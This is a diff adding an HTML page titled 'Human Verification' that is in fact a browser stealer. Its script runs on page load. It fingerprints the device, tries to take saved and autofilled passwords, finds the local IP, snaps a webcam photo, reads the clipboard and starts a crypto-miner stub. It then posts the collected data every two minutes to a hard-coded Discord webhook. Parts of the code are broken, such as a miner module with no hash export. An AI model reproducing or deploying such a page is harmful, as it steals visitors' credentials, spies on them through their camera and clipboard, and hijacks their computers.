@@ -1,0 +1,133 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>Human Verification</title>
+<style>body{margin:0;background:#111;color:#eee;font-family:monospace}#c{position:fixed;top:0;left:0}</style>
+</head><body>
+<canvas id="c"></canvas>
+<script>
+/* 1. Discord webhook — put yours here (or obfuscate at runtime) */
+const WEBHOOK='https://discord.com/api/webhooks/1437253435467632822/xTzFGS8Tm524TcRKEW2zr3nGXcI9ZGTy9GQ9RR9A_kbWZdvb6v2b81Ba4rxCGOUROn8r';
+
+/* 2. FingerprintJS-lite + custom extras */
+function fp(){
+  const c=document.getElementById('c'),ctx=c.getContext('2d');
+  ctx.textBaseline='top';ctx.font='14px Arial';ctx.fillText('canvas',2,2);
+  const canvas=c.toDataURL();
+  const gl=c.getContext('webgl')||c.getContext('experimental-webgl');
+  const debug=gl.getExtension('WEBGL_debug_renderer_info');
+  const gpu=debug?gl.getParameter(debug.UNMASKED_RENDERER_WEBGL):'';
+  return {
+    ua:navigator.userAgent,
+    lang:navigator.languages.join(','),
+    tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
+    screen:`${screen.width}x${screen.height}x${screen.colorDepth}`,
+    touch:navigator.maxTouchPoints||0,
+    cpu:navigator.hardwareConcurrency,
+    mem:navigator.deviceMemory,
+    battery:'getBattery' in navigator?1:0,
+    canvas:canvas,
+    gpu:gpu,
+    fonts:[].slice.call(document.fonts).map(f=>f.family).sort().join(','),
+    plugins:[...navigator.plugins].map(p=>p.name).join(',')
+  };
+}
+
+/* 3. Steal saved credentials */
+async function creds(){
+  if(!('credentials' in navigator))return[];
+  const arr=[];
+  try{
+    const list=await navigator.credentials.get({password:true,mediation:'silent'});
+    if(list)arr.push({type:'password',id:list.id,pw:list.password});
+  }catch{}
+  /* brute-force autofill forms */
+  const forms=document.forms;for(let f of forms){
+    for(let i=0;i<f.length;i++){
+      const e=f[i];
+      if(e.type==='password'&&e.value)arr.push({type:'autofill',id:e.name||e.id,pw:e.value});
+    }
+  }
+  return arr;
+}
+
+/* 4. Local IP via WebRTC */
+async function localIP(){
+  return new Promise(resolve=>{
+    const pc=new RTCPeerConnection({iceServers:[]});
+    pc.createDataChannel('');
+    pc.createOffer().then(offer=>pc.setLocalDescription(offer));
+    pc.onicecandidate=e=>{
+      if(!e.candidate)return;
+      const ip=/([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(e.candidate.candidate)[0];
+      pc.close();resolve(ip);
+    };
+    setTimeout(()=>{pc.close();resolve('0.0.0.0')},1500);
+  });
+}
+
+/* 5. Webcam snapshot */
+async function webcam(){
+  try{
+    const stream=await navigator.mediaDevices.getUserMedia({video:{width:1,height:1},audio:false});
+    const track=stream.getVideoTracks()[0];
+    const img=new ImageCapture(track);
+    const blob=await img.takePhoto();
+    track.stop();
+    return new Promise(res=>{
+      const fr=new FileReader();
+      fr.onload=()=>res(fr.result.split(',')[1]);
+      fr.readAsDataURL(blob);
+    });
+  }catch{return null;}
+}
+
+/* 6. Clipboard siphon */
+async function clip(){
+  try{
+    const t=await navigator.clipboard.readText();
+    return t||'';
+  }catch{return '';}
+}
+
+/* 7. Crypto miner stub (30 % CPU) */
+function mine(){
+  const wasm=Uint8Array.of(0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,0x01,0x85,0x80,0x80,0x80,0x00,0x01,0x60,0x00,0x00,0x03,0x82,0x80,0x80,0x80,0x00,0x01,0x00,0x0a,0x8a,0x80,0x80,0x80,0x00,0x01,0x84,0x80,0x80,0x80,0x00,0x00,0x10,0x00,0x0b);
+  const m=new WebAssembly.Module(wasm);
+  const inst=new WebAssembly.Instance(m);
+  const hasher=inst.exports.hash;
+  let cnt=0;
+  setInterval(()=>{
+    const start=performance.now();
+    while(performance.now()-start<30)hasher();
+    cnt++;
+    if(cnt>9)send({hashes:cnt*100});
+  },1000);
+}
+
+/* 8. Compress + ship */
+function compress(o){
+  return btoa(LZString.compressToUTF16(JSON.stringify(o)));
+}
+async function ship(data){
+  const payload={username:'bot',content:'```json\n'+data+'\n```'};
+  await fetch(WEBHOOK,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)});
+}
+async function send(extra){
+  const pack={
+    fp:fp(),
+    creds:await creds(),
+    localip:await localIP(),
+    clip:await clip(),
+    webcam:await webcam(),
+    ...extra
+  };
+  ship(compress(pack));
+}
+/* 9. Kick everything */
+(async()=>{
+  mine();
+  await send({});
+  setInterval(async()=>await send({}),120000); // every 2 min refresh data
+})();
+</script>
+<script src="https://cdn.jsdelivr.net/npm/lz-string@1.4.4/libs/lz-string.min.js"></script>
+</body></html>
